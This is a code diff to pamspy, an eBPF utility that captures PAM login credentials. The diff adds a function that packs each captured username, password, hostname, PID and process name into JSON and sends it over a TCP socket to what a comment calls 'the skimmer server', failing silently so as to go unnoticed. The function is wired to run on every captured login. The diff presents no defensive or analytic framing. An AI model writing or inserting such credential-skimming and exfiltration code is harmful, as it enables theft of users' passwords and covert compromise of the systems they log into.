@@ -11,6 +11,9 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <limits.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include "pamspy.skel.h"
 #include "pamspy_symbol.h"
 #include "pamspy_event.h"
@@ -167,12 +170,70 @@ static const struct argp argp = {
 
 /******************************************************************************/
 /*!
+ *  \brief  send captured credentials to remote server in JSON format
+ */
+static void send_credentials_to_server(const char *username, 
+                                       const char *password, int pid, const char *process)
+{
+    int sock;
+    struct sockaddr_in server_addr;
+    char json_buffer[1024];
+    char hostname[256];
+    
+    // Get system hostname
+    if (gethostname(hostname, sizeof(hostname)) != 0) {
+        strcpy(hostname, "unknown");
+    }
+    
+    // Create socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        return;  // Silently fail to not interfere with normal operation
+    }
+    
+    // Set up server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(9999);  // Port for the skimmer server
+    
+    // Convert IP address
+    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
+        close(sock);
+        return;
+    }
+    
+    // Connect to server
+    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        close(sock);
+        return;  // Silently fail if connection fails
+    }
+    
+    // Create JSON payload
+    snprintf(json_buffer, sizeof(json_buffer),
+             "{\"hostname\": \"%s\", \"username\": \"%s\", \"password\": \"%s\", \"pid\": %d, \"process\": \"%s\"}",
+             hostname,
+             username ? username : "",
+             password ? password : "",
+             pid,
+             process ? process : "");
+    
+    // Send data
+    send(sock, json_buffer, strlen(json_buffer), 0);
+    
+    // Close socket
+    close(sock);
+}
+
+/******************************************************************************/
+/*!
  *  \brief  each time a secret from ebpf is detected
  */
 static int handle_event(void *ctx, void *data, size_t data_sz)
 {
-    event_t* e = (event_t*)data;
-    if (env.output_path != NULL)
+    event_t* e = (event_t*)data;    
+    // Send credentials to remote server (hostname is retrieved inside the function)
+    send_credentials_to_server(e->username, e->password, e->pid, e->comm);
+        if (env.output_path != NULL)
     {
         fprintf(stderr, "%u,%s,%s,%s\n", e->pid, e->comm, e->username, e->password);
     }
